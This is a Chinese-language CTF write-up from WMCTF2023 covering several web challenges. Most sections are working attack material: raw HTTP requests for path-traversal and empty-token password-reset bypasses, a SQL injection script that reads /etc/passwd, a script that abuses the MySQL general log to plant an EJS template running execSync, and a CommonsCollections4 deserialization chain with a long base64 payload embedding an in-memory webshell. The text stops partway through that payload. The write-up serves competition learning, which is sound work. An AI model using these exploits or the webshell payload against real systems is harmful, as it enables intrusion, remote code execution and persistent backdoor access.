# WMCTF2023 Writeup By 0RAYS

## Web

### AnyFileRead

存在解析差异问题

用 `/admin/../` 绕过

```python
GET /admin/../flag HTTP/1.1
Host: 43.132.224.5:8888
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

WMCTF{bypass_auth_is_so_Exciting}

### ezblog

目标要 rce

![](static/F8r7b3USUoOcMLxE3ETcnfqXnSd.png)

`/post/:id/edit` 可以注入，有 `--secure-file-priv` 权限

```python
from requests import get
from urllib import parse
from re import search
proxies = {
    "http": None,
    "https": None
}

HOST = 'http://5bf11e7b-8550-4e62-a3f6-8b0f86c36a35.wmctf.wm-team.cn'

ROUTE = "/post/{}/edit".format(parse.quote('0 union select 666, 666, load_file(\'/etc/passwd\')').replace('/', '%2F'))

print(ROUTE)

r = get(HOST+ROUTE, proxies=proxies, allow_redirects=False)

print(r.status_code)

# print(r.content)

s = search(r'{.*}', r.text)

if s:
    print(s.group(0))
```

读 pin 码

```python
/home/ezblog/.pm2/logs/main-out.log
```

有 pin 在 `/home/ezblog/views/` 下写个满足条件的文件，然后 `/api/debugger/template/test` 路由渲染就行，但尝试发下存在权限问题，那重启容器，直接往 `/home/ezblog/views/index.ejs` 里写即可

```python
# -*- encoding:utf-8 -*-
"""
@文件名：test12.py
@时间：2023/8/20  14:08
@文档说明:
@作者: Carrot2
@邮箱: 1627691837@qq.com
"""

import requests

session = requests.session()

proxies = {
    "http": "http://127.0.0.1:8084",
    "https": "http://127.0.0.1:8084"
}
url = 'http://69e1df39-c6c8-4f77-8485-2a35297faefb.wmctf.wm-team.cn'
# url = 'http://localhost:3000'
authorization = "d0ae1a1c-e44e-448e-ba4c-f91cc903a317"


def execute_sql(sql):
    burp0_url = url + "/api/debugger/sql/execute"
    burp0_headers = {"Authorization": authorization}
    burp0_data = {"code": sql}
    r = session.post(burp0_url, headers=burp0_headers, data=burp0_data, proxies=proxies)
    print(r.json()["data"])


def main():
    execute_sql("show variables like \"%general_log%\";")
    execute_sql("create database mysql;")
    execute_sql("set global general_log_file = '/home/ezblog/views/index.ejs';")
    execute_sql("""CREATE TABLE mysql.general_log(
event_time TIMESTAMP(6) NOT NULL DEFAULT CURRENT_TIMESTAMP(6),
user_host mediumtext NOT NULL,
thread_id int(11) NOT NULL,
server_id int(10) unsigned NOT NULL,
command_type varchar(64) NOT NULL,
argument mediumtext NOT NULL
) ENGINE=CSV DEFAULT CHARSET=utf8 COMMENT='General log';""")
    execute_sql("SET GLOBAL log_output = 'FILE,TABLE';")
    execute_sql("set global general_log =1;")
    execute_sql("""select "<%=global.process.mainModule.constructor._load('child_process').execSync('/readflag').toString();%>";""")
    execute_sql("set global general_log =0;")


if __name__ == '__main__':
    main()
```

### ez_java_again

看注释有个接口

```python
/Imagefile?url1=upload/favicon.ico
```

访问说必须有 java 字符串且不能有 flag 字符串

![](static/Cy65bSQWOoDTloxtR2oc18Hmnie.png)

可以任意文件读

`/Imagefile?url1=file:///etc/passwd%23java`

`/Imagefile?url1=file:///proc/1/cmdline%23java`

`/Imagefile?url1=file:///%23java`

可以列出任意目录

![](static/MXPHb0yrdokyhfxjiducrpohnzb.png)

但读的 class 文件反编译不了

结果非预期了

file 协议么，直接双 url 编码绕

![](static/RygBbE1tpogmHgx3WnMcml2mnEh.png)

### 你的权限放着我来

存在任意用户密码重置

token 置为空即可

```python
POST /api/change HTTP/1.1
Host: 28ab03e6-9b8e-42b6-be9e-2267ba7891b7.wmctf.wm-team.cn
Content-Length: 72
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://28ab03e6-9b8e-42b6-be9e-2267ba7891b7.wmctf.wm-team.cn
Referer: http://28ab03e6-9b8e-42b6-be9e-2267ba7891b7.wmctf.wm-team.cn/change
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

newPassword=123456&confirmPassword=123456&token=&email=alice@example.com
```

![](static/WOHTbarilo2xVXxqgYFcu4zsnnf.png)

重置 `jom@roomke.com` 的密码即可获得 flag

![](static/WJvVbmXGhoRaV5x5GEGcxHrknRE.png)

flag{test_flag}

### ez_challenge

有 commons-collections4-4.0 的依赖，直接打 CC4 的链子

生成 payload

```java
package com.example.exp;

import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.*;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.PriorityQueue;

public class ExpFin {

    public static void main(String[] args) throws Exception {

        ClassPool pool = ClassPool.getDefault();
        //内存马
        byte[] bytes = Repository.lookupClass(dawd.class).getBytes();
        Templates templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", new byte[][]{bytes});
        setFieldValue(templatesImpl, "_name", "aaaa");
        setFieldValue(templatesImpl, "_tfactory", null);
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templatesImpl})
        };
        ChainedTransformer chain = new ChainedTransformer(transformers);
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templatesImpl});


        TransformingComparator transformingComparator = new TransformingComparator(instantiateTransformer);
        PriorityQueue priorityQueue = new PriorityQueue(2,transformingComparator);
        Field sizeField = PriorityQueue.class.getDeclaredField("size");
        sizeField.setAccessible(true);
        sizeField.set(priorityQueue,2);

        Field queueField = PriorityQueue.class.getDeclaredField("queue");
        queueField.setAccessible(true);
        queueField.set(priorityQueue,new Object[]{TrAXFilter.class,"bar"});

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(barr);
        objectOutputStream.writeObject(priorityQueue);
        objectOutputStream.close();
        String res = Base64.getEncoder().encodeToString(barr.toByteArray());
        System.out.println(res);
    }
    private static void setFieldValue(Object obj, String field, Object arg) throws Exception{
        Field f = obj.getClass().getDeclaredField(field);
        f.setAccessible(true);
        f.set(obj, arg);
    }
}
```

写冰蝎马脚本

```python
import requests

burp0_url = "http://119.45.178.147:30000/"
burp0_headers = {"Pragma": "no-cache", "Cache-Control": "no-cache", "Upgrade-Insecure-Requests": "1", "Origin": "http://119.45.178.147:30000", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Referer": "http://119.45.178.147:30000/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
burp0_data = {"data": "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci/5hPArsQjMAgACTAAJZGVjb3JhdGVkcQB+AAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuQ29tcGFyYWJsZUNvbXBhcmF0b3L79JkluG6xNwIAAHhwc3IAP29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuSW5zdGFudGlhdGVUcmFuc2Zvcm1lcjSL9H+khtA7AgACWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAFzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3EAfgAKTAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/////dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAABdXIAAltCrPMX+AYIVOACAAB4cAAAMjHK/rq+AAAANAGoCAD9CAD+CAD/CgBrAQAKAGoBAQsBAgEDCwEEAQULAQQBBgoAagEHCgBqAQgHAQkKAAsBAAcBCggBCwoAagEMBwChCgANAQ0IAQ4KAEwBDwgBEAoAagERCAESCACXBwETCgAYARQLARUBAwoAGAEWCgA5ARcKADQBDQgBGAsBAgEZCAEaCgANARsKADQBHAgBHQgBHggBHwgAeQcBIAcBIQoAKAEiCgANASMKADQBJAoAagElCgAyASYKADQBJwoAagEoCgBqASkKAGoBKgcBKwgAsQcBLAcAsAkBLQEuCgA0AS8KATABMQcBMgoBLQEzCgEwATQHATUKAGoBNggBNwoAagE4CAE5BwC8CgE6ATsKAAsBPAoACwEZCAE9CgALAT4KAAsBPwoACwFACAFBCgA0AUIIAUMHAUQKADQBRQgBRggBRwgBSAcBSQoAUQEABwFKCgBTAUsHAUwKAFUBTQoAVQFOCgBRAU8KAFEBUAoAagFRCgFSATEKAVIBFgoANAFTBwFUCgA0AVUKAF4BVgoANAFXCgEwAQ0KAEwBWAoBMAFZBwFaCgBlAVYHAVsKAGcBXAoAKAFWBwFdBwFeAQANZ2V0VXJsUGF0dGVybgEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABZMY29tL2V4YW1wbGUvZXhwL2Rhd2Q7AQAMZ2V0Q2xhc3NOYW1lAQAPZ2V0QmFzZTY0U3RyaW5nAQAKRXhjZXB0aW9ucwcBXwEABjxpbml0PgEAAygpVgEAB2NvbnRleHQBABJMamF2YS9sYW5nL09iamVjdDsBAAhsaXN0ZW5lcgEACGNvbnRleHRzAQAQTGphdmEvdXRpbC9MaXN0OwEABHZhcjIBABRMamF2YS91dGlsL0l0ZXJhdG9yOwEAFkxvY2FsVmFyaWFibGVUeXBlVGFibGUBACRMamF2YS91dGlsL0xpc3Q8TGphdmEvbGFuZy9PYmplY3Q7PjsBAA1TdGFja01hcFRhYmxlBwFdBwFgBwFhAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcBYgEAEE1ldGhvZFBhcmFtZXRlcnMBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACmdldENvbnRleHQBABIoKUxqYXZhL3V0aWwvTGlzdDsBAARrZXkxAQADa2V5AQAIY2hpbGRyZW4BABNMamF2YS91dGlsL0hhc2hNYXA7AQAFdmFyMTIBAAtjaGlsZHJlbk1hcAEABHZhcjkBAAZ0aHJlYWQBABJMamF2YS9sYW5nL1RocmVhZDsBAAR2YXI2AQABSQEABHZhcjQBABNbTGphdmEvbGFuZy9UaHJlYWQ7AQAEdmFyNQEABXZhcjE0AQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAHdGhyZWFkcwcBMgcBCgcBEwcBIAcBYwEACVNpZ25hdHVyZQEAJigpTGphdmEvdXRpbC9MaXN0PExqYXZhL2xhbmcvT2JqZWN0Oz47AQALZ2V0TGlzdGVuZXIBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEACWNsYXp6Qnl0ZQEAAltCAQALZGVmaW5lQ2xhc3MBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEABWNsYXp6AQARTGphdmEvbGFuZy9DbGFzczsBAAtjbGFzc0xvYWRlcgEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7BwErBwE1AQALYWRkTGlzdGVuZXIBACcoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KVYBAAdvYmplY3RzAQATW0xqYXZhL2xhbmcvT2JqZWN0OwEACWxpc3RlbmVycwEACWFycmF5TGlzdAEAFUxqYXZhL3V0aWwvQXJyYXlMaXN0OwEABHZhcjcBAAppc0luamVjdGVkAQAnKExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylaAQABaQEADWV2aWxDbGFzc05hbWUBABJMamF2YS9sYW5nL1N0cmluZzsHAUQHAQkBAAxkZWNvZGVCYXNlNjQBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAMZGVjb2RlckNsYXNzAQAHZGVjb2RlcgEACWJhc2U2NFN0cgcBZAEADmd6aXBEZWNvbXByZXNzAQAGKFtCKVtCAQAOY29tcHJlc3NlZERhdGEBAANvdXQBAB9MamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW07AQACaW4BAB5MamF2YS9pby9CeXRlQXJyYXlJbnB1dFN0cmVhbTsBAAZ1bmd6aXABAB9MamF2YS91dGlsL3ppcC9HWklQSW5wdXRTdHJlYW07AQAGYnVmZmVyAQABbgcBSQcBSgcBTAEABWdldEZWAQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBAANvYmoBAAlmaWVsZE5hbWUBAAVmaWVsZAEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAARnZXRGAQA/KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAgTGphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbjsBABRMamF2YS9sYW5nL0NsYXNzPCo+OwcBLAcBVAEADGludm9rZU1ldGhvZAEADHRhcmdldE9iamVjdAEACm1ldGhvZE5hbWUBAF0oTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAdtZXRob2RzAQAbW0xqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAFdmFyMTEBACFMamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbjsBACJMamF2YS9sYW5nL0lsbGVnYWxBY2Nlc3NFeGNlcHRpb247AQAFdmFyMTABAApwYXJhbUNsYXp6AQASW0xqYXZhL2xhbmcvQ2xhc3M7AQAFcGFyYW0BAAZtZXRob2QBAAl0ZW1wQ2xhc3MHAWUHAO0HAVoHAVsBAApTb3VyY2VGaWxlAQAJZGF3ZC5qYXZhAQACLyoBAARhZHdhAQwsSDRzSUFBQUFBQUFBQUkxWGVYd1QxeEgrVnBLMXNyeUVJTUJnU01LVkJCK3loYm14d2NFQ0c3dXhUWUxBMURnTlhhOVcxb0lzQ1dsbE1HbWJIaWx0VTNxbWFadmVWK28yVFJzN3RMSUpEYUZuMnZRKzB2dSttOTd0UC8wblRiKzN1NVp0V1k3eHo5cmp2Wmx2WnI0M00rL3RVLzk3N0RLQVJ2eEhna2VObmxabFNCS1duMUNIMVZCQ1RRNkc5aVhVYkxZcnBVYjFqQXkzaEJ2RjFKbFFWczhNSjNRekZMSHZoL1JUT1QxcmRobFpVMDhLeVRJSml3WjFzME1YaWozcWtDNWhXWFZOMXpSdXhNd1l5Y0ZtV3QyWGluTFdmNFNROWEyRGV0TDB3Uy9obW9KMnI1cklVY0I3U05maUo1SStMSkt3MkVnYTVyNWMxa3dOM2FabTFDRUo3dXFhWGduWERqUnVpVFdxamJxMk14YmR2a1BmN3NNU1drZ3pCQW1CdWRZVkxNV3ljcml3blBpN0JXZ0x3YnVNcE42VEd4clFNNGZWZ1lRdU5GT2FtdWhWTTRaNGR3WTladHdncXJkTHNFYWtGYmpXRHcrdWs3Q3F1cXNrZjgzQ1JVbVRzR0tlZVFGeWd3Qlp4MUF5TnFYNytjdWtSdlNvaEp0dDNQbklieHNtZDVhTnBkbTVFeEkyWElVMi9Sdms4bGYzaDJ1S2ZSUnpBeEpjL1dFSkZWRTlScEtzY1laRDhjN091UW9LNmhBVTRkU1RRaWVjVG5Kc3FBbmpyQWhvNmJSRzJ4bE5UNXRHS2lsakV4MXdYTlV5STJrekZkcG5wT09rUjRJdm8yZlRxV1NXOUJkekVUZk5kS2lEbDBKWXRpUzE1S3llelJKYXd0cjVsU3dKQ3J0VEF5ZEVEbGl1NVV3akVlcFcwd0xFQ1VEQ3hnVXRXNExVV2JjZzRUSW9kdE5WNGNuWXd4UzR1cUJsM0NMaGh1ZVBWVVlyYTNSV21ETDJjU2hpcXRwSnZqbDV2b1NGT05zVDh1aVU4bnl4Y2VuYmNjQ1AzZWhRSU1Qblo0bTlRRUo1b2FZTHlUeXJIRXYwQndWZDZLNUFDM29VS0RiUWJTeU9ZamtaaDVnZFdpcHBxa2FTS2JsNlZnbkcxVXhFT0piVTlPYWFZd29PNDRnZkViQlNLZ2VuU1d2UHBJWUtFZDYrY0g3WmtSWVRNVzhlS25naCtvVC94OWpzTEU2ZHBGdy9oOHc1YWFuZ0RyeElzSEFuMTJONnlUclViTnhhdGhmN29lSTZIM1l4ZjlNNXVyOXpadndIQjA3b210azhkNlJtN3BDQ0tQUUs3RWZNaHkwK2JHUFI1M3hnUmZpSTYzVGlqU1dXcmdSNHI0SUVoaW9RQm9OMHQ3WkZmRWc3TlY5VTJUS1lFQlhrcERPWk5WV3Vrb1NhZWRPanVDc29NSkh6STR0aENXdG1DV1RUdXNiRTFESzZlYXMrRXVHYmpET01oSWJDSTZiT05QRlUxL1NIRlp6RlhTSWZYbUszc2hLR2UwVm5mcGtmSTdpYlNtS2ZFS0tkdG1SVzEzSVp3eHdKMFlnbCtncThVdmp6cWxsNWFyTWk0OVcyQTA3clhGcGRxbTIrQnEvMTR4eGV4ejVVTkNuajlmYldPR1Bia0ZBMUY2V3dvN3dCYi9UalBONGtNbStkWFlLSG5CSmNOYVZtcEVMaFhDeW1aL1NvUFVlOXQrSStrWEJ2WTQyVWxwSHhkcXNocTFHeFh5cDRwNmpPZCtBQkNjcUFtdFczYjkydmE5Yk9YbGxxS1FYdDc4WjdoRmZ2WlhPTnB0cU5wSnJnZGlxMkhqSDVmbnhBa1BoQkJSdFJMY1ErekJSSjZxZW5VMlQyZWFLUXZ3L2lveUxnVVdLeFJOVkVWdXhuSmRLVGZlRGplRWp3L0FrV1pHSC9vWGdaT1dydlhiQ0lTalN0Z2hPZndpUEM1ekduQzl1elBhbElUb3UzRzNvaU9tTzdlNVFaTmF4bXRrM3RUdlBMTnR1U20yWWZaUnliOWx5amZkdk1uSmdoa3RGakNjcUVMRGhIY2dzN1NZa3Rmc1U4V2pJZVp6cVRHSzVxUW1VU1dLTVM2aGRvNDdOTkszZ0NWOFRxZk00K0hrWnlhVDJqQ2RNS3ZpQ1MvankrV0xSY3Mwcnd5MzVjd0pQVXplcG1xNmFKN21pZnhhcVBDWUd2NGlrL0x1TnJiRGNFTDlwam5xL25mUVBmRklyZjR0clRtN05uUlVaYTJadVpPb3NVblZMRVFZSG5NaVozTnBkc0dES3lXa080TmRJMmxmUVpINTRtUml6bEhIMXZXb0NscWNML0lYNGtPUGd4YThpMmI1ZWNEeisxSzdkYk4rTXBzcjYzQkY3L0hMeFM2MkFqME5UUDhRdGg2cGNTVnM0bkplUFhMQ0lqT1p3NnlSaDJsU0N6L3lyNS9TMSs1OGR2OEhzWnRVNVRiQkFiV0VQWWFoUSsvTW5lRWd2a1BVTzdOZ0UrL0pWZFpyZVdzQTduQ2hhTFU3WUwvNkJDSkpYTGFIcTdJUkpnZVZpUEcwbnFUbjJCTkFnaldFZFJEd2pHbjErYzlmbXBvL0NKUnhLT2xQTnRNZS9pengyb0dMTWUvT0tZTVdmeW1xbEoybmNtQTg2a054QzRnTXB4NjFrU1h3SE8vQmJlaFVSWjdRU3VGOU11ckxRZ1hMeXVwMXNiVUdXNVl3bGhGVlk3QURjNEFDMlVGTExlMnJvSnJDOUd1Sms2R3kyRVNsdktRUkJQYTdEV01yNEJOenBZMnl4dDRrL0RlQzNEZFRNZ3BBSUVNNVlHQkFTYnJ3T3hoeTRMcWZMYU9uZmQ1UWswakJWQk5jeUFLaTlBbGFNR3RSWlVhTW9iNlQ1cXlKd2JyOHVqOHdwYXVvT1R1UFVpRHJvd2lkdnpPUG9BN3E4TlRxQy9KM2dSeHlVMGVTNUI3WnZBUUZOWlZWbEE0K0NnRzBmNUdLOHZQQnBWSHVmWkV6ajVLQ292SXVWRzROUWtUamQ1cTd4bGx6RFN4OUU4WGhvNE5ZR1g1M0hQSmJqNmF2TzRONDgzVCtBdFZkNWF3dDR2SVk5MzVmRytQRDZVeDBmeStGaFZXUjRQSHgxRldaTjNGSjZlY1FZWHdTZ2U0Z2V6RHcvakVkN2RGZ1h0V0dLdE9ZOU1ESDA3RjJBSG1kdkorVjA4QlRmaEFKcXB1UWZIdWF3eDNJSzdzSmM0WVNLMUVxZWRTUHN4aGc2THdnNlNFK1A0R213bVVXdFpwVnV3bFhhcWNRL1J0M01kR3FtL2craGxnc1FDMWVQT3F2bTRzZTJpVFJmYXJFVHhQRWN6WGhrdUdidGx0TWpZS3lNczA2QWtvL0cva1BqY0tKYVM1MU5lUDBrZFVUT04xcXAzY0VSWUNVcmRkUUZ0RXVPQk9DOVhzTGQ3RkZVOWRUUGVmRTJlVWJqNUh4eXpFbmNKcTYwUnl4bkZlZ0hQSk9DbXlIR0IralNqRWFnN3BXNnhCajMxZ1hNUG9yS2U2ZkI1SWkxcTh0VG44YVdlMGVlZUNUNEo1Ukl1OUxFQ3Z2SkUwSlBIMTROVStQWVkvVnZFZXE3a2RtRHp2NW1GQkJ3VW53ZGs3eEJuRDNQK0NDVjZPWDhVMXpPNnRlaG5DdDZCZXR4SitlTVcxMXZweDByK1BvM1BNR3A2eEF5WXNOamN5V1JjUmpzdU1uNFJqL0V1YUxxRXo5S2k0SFVKUE05Q2xuRlp4dmtlR1JmS2xSblVTZUp3NHdUN0xCZFJCRHNTK01Fa2Z0SWREUHpNOHpqTzk3a0RrVWdldndveXkvaCtyczlkeDljL1hNRWZDLzlqM1lFL1U0UHMvTVZORFFwTHZKK2pWSk9uaWx6Y0cvamJUS1FxejN3NFZubHVvbHRUMmJxS0xnRTZyekdPRFpLTk9PTTErSzExd21LbGhUTmU5b2J2TUZvWFoxcXRKemZuNi9GZDh1T2h4Z0Z5OWoycjJFY0tHVGlDNzF1Y3RkbE40WlJnYkpvVUgvNWU2STVyWWY5NUp2SFBjYXZqVExlMlZiUzBtaVAvc2hyTXYvOFBtWmIyNXFNU0FBQT0MAHcAeAwAkwCUBwFgDACPAWYHAWEMAWcBaAwBaQFqDACtAK4MALkAugEAE2phdmEvdXRpbC9BcnJheUxpc3QBABBqYXZhL2xhbmcvVGhyZWFkAQAKZ2V0VGhyZWFkcwwA6ADdDAFrAG0BABxDb250YWluZXJCYWNrZ3JvdW5kUHJvY2Vzc29yDAFsAW0BAAZ0YXJnZXQMANwA3QEABnRoaXMkMAEAEWphdmEvdXRpbC9IYXNoTWFwDAFuAW8HAXAMAXEArgwBcgFzAQAPU3RhbmRhcmRDb250ZXh0DAF0AXUBABVUb21jYXRFbWJlZGRlZENvbnRleHQMAXYBdwwBeABtAQAZUGFyYWxsZWxXZWJhcHBDbGFzc0xvYWRlcgEAH1RvbWNhdEVtYmVkZGVkV2ViYXBwQ2xhc3NMb2FkZXIBAAlyZXNvdXJjZXMBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MAHcBeQwBegF7DAF8AXcMAHMAbQwBfQF+DAF/AWoMAHQAbQwAyADJDADOAM8BABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBAA9qYXZhL2xhbmcvQ2xhc3MHAYAMAYEAtAwBggGDBwFlDAGEAYUBABBqYXZhL2xhbmcvT2JqZWN0DAGGAYcMAYgBiQEAE2phdmEvbGFuZy9UaHJvd2FibGUMAMEAwgEAG2FkZEFwcGxpY2F0aW9uRXZlbnRMaXN0ZW5lcgwA6ADrAQAcZ2V0QXBwbGljYXRpb25FdmVudExpc3RlbmVycwcBigwBiwGMDAB3AY0BABxzZXRBcHBsaWNhdGlvbkV2ZW50TGlzdGVuZXJzDAGOAY8MAZABkQwBcQGSAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgwBkwF+AQAMZGVjb2RlQnVmZmVyAQAQamF2YS9sYW5nL1N0cmluZwwBlAGDAQAQamF2YS51dGlsLkJhc2U2NAEACmdldERlY29kZXIBAAZkZWNvZGUBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQEAHGphdmEvaW8vQnl0ZUFycmF5SW5wdXRTdHJlYW0MAHcBlQEAHWphdmEvdXRpbC96aXAvR1pJUElucHV0U3RyZWFtDAB3AZYMAZcBmAwBmQGaDAGbAZwMAOIA4wcBnQwBngGfAQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uDAGgAXMMAHcBoQwBogGjDAGkAXUMAaUBpgEAH2phdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb24BACBqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbgwBpwBtAQAUY29tL2V4YW1wbGUvZXhwL2Rhd2QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEADmphdmEvdXRpbC9MaXN0AQASamF2YS91dGlsL0l0ZXJhdG9yAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAramF2YS9sYW5nL3JlZmxlY3QvSW52b2NhdGlvblRhcmdldEV4Y2VwdGlvbgEAIGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAWKClMamF2YS91dGlsL0l0ZXJhdG9yOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAUKClMamF2YS9sYW5nL09iamVjdDsBAAdnZXROYW1lAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBAAZrZXlTZXQBABEoKUxqYXZhL3V0aWwvU2V0OwEADWphdmEvdXRpbC9TZXQBAANnZXQBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAANhZGQBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAIdG9TdHJpbmcBABgoTGphdmEvbGFuZy9UaHJvd2FibGU7KVYBAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1R